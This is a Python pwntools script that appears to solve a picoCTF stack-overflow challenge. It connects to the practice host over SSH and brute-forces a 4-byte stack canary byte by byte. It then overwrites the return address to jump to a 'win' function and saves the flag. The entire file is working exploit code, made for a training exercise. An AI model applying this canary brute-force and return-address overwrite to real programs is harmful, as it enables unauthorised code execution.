from pwn import *
import re
import sys
import os
import time

context.log_level = 'error'

def run():
    s = ssh(host='dolphin-cove.picoctf.net', user='ctf-player', port=61936, password='1ad5be0d')
    sh = s.process('./start')
    output = sh.recvall(timeout=5)

    m = re.search(b'Selected file: (.*?)\n', output)
    if not m:
        print("Failed to start")
        return None, None
    c_file = m.group(1).decode()
    bin_file = c_file[:-2]

    print(f"File is {c_file}")
    s.download(c_file, 'source_remote.c')
    s.download(bin_file, 'binary_remote')
    os.chmod('binary_remote', 0o755)
    return s, bin_file

s, bin_file = run()
if not s:
    sys.exit(1)

with open('source_remote.c', 'r') as f:
    src = f.read()

bufsize_match = re.search(r'#define BUFSIZE (\d+)', src)
bufsize = int(bufsize_match.group(1))
print(f"Bufsize: {bufsize}")

elf = ELF('./binary_remote')
win_addr = elf.symbols['win']
print(f"Win addr: {hex(win_addr)}")

canary_offset = bufsize
print(f"Canary offset: {canary_offset}")

canary = b''
for i in range(4):
    for c in range(256):
        try:
            p = s.process('./' + bin_file)
            p.recvuntil(b'> ')
            p.sendline(str(canary_offset + i + 1).encode())
            p.recvuntil(b'Input> ')
            p.send(b'A' * canary_offset + canary + bytes([c]))
            output = p.recvall(timeout=0.5)
            p.close()
            if b'Smashing' not in output:
                canary += bytes([c])
                print(f"Found canary byte {i}: {hex(c)}")
                break
        except Exception as e:
            print(f"Error {e}")
            sys.exit(1)

print(f"Canary: {canary}")

for eip_offset in range(12, 32, 4):
    p = s.process('./' + bin_file)
    p.recvuntil(b'> ')
    payload = b'A' * canary_offset + canary + b'B' * eip_offset + p32(win_addr)
    p.sendline(str(len(payload)).encode())
    p.recvuntil(b'Input> ')
    p.send(payload)
    output = p.recvall(timeout=1)
    p.close()
    if b'picoCTF{' in output:
        print(f"EIP offset: {eip_offset}")
        print(output.decode())
        with open('flag.txt', 'wb') as f:
            f.write(output)
        sys.exit(0)
